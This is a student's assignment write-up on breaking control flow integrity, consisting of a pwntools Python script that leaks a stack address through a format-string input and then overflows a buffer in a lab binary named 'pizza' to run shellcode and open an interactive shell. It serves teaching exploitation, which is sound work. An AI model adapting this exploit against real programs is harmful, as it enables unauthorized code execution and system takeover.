# Assignment 10
The goal of this assignment was to learn about control flow integrity and how to break it. I did this by using pwntools, a python library designed to exactly this.

## Code
~~~python3
from pwn import *

# A simple function that takes a core file and prints the stack, it prints the number entered as the total lines and prints the lines around where the stack pointer was when the program crashed.
def print_stack(core, num=20):
    rsp = core.rsp
    print("Stack")
    x = num//2
    for i in range(x, 1, -1):
        tmp = rsp + 8 * i
        print(f"{tmp:x}\t{core.read(tmp, 8)}")

    print(f"{tmp:x}\t{core.read(rsp, 8)} <------- RSP")

    for i in range(1, x):
        tmp = rsp - 8 * i
        print(f"{tmp:x}\t{core.read(tmp, 8)}")



#### MAIN ####

# Executable and Linkable Format
elf = ELF("./pizza")

# Set the context in pwn to machine settings
context(arch='amd64', os='linux', endian='little', word_size=64)

# Get the addresses to function names
# getname_address = elf.symbols["getname"]
# print(hex(getname_address))

# Loads in pwn's shell code as assembly
shellcode = asm(shellcraft.amd64.linux.sh())

# Prints shellcode as assembly
# print(shellcraft.amd64.linux.sh())

# Prints shellcode as hex
# print(shellcode.hex().upper())

# Start the target process we will be breaking into 
victim = process("./pizza")

# First input tricks the program into printing stack and other locations
input1 = b"%p %p %p %p %p %p %p %p %p %p"

# Get the first line of output
print(str(victim.recvline(), "latin-1"))

# Send our "name" aka "%p %p.."
victim.sendline(input1)

# Get the response and parse it into getting the stackpointer
line = str(victim.recvline(), "latin-1")
print(line)
# Subtract the offset to the start of our shellcode
addr = int(line.split(" ")[7], 16) - 112
# Create our second input, which will have the shellcode, then a bunch of garbage until the return adress to the shell code.
input2 = shellcode + b"A"*88 + addr.to_bytes(8, 'little')


line = str(victim.recvline(), "latin-1")
victim.sendline(b"4")

# Send our shellcode 
victim.sendline(input2)

# Give the control back to us
# Now we have access to the computer as whoever ran ./pizza
victim.interactive()

victim.wait()

# This finds the corefile from a segfault and lets us parse it
# core = victim.corefile
# print_stack(core, 40)

# print(input2)
# print(disasm(core.read(core.rip,8))) # prints next instructions
exit()
~~~
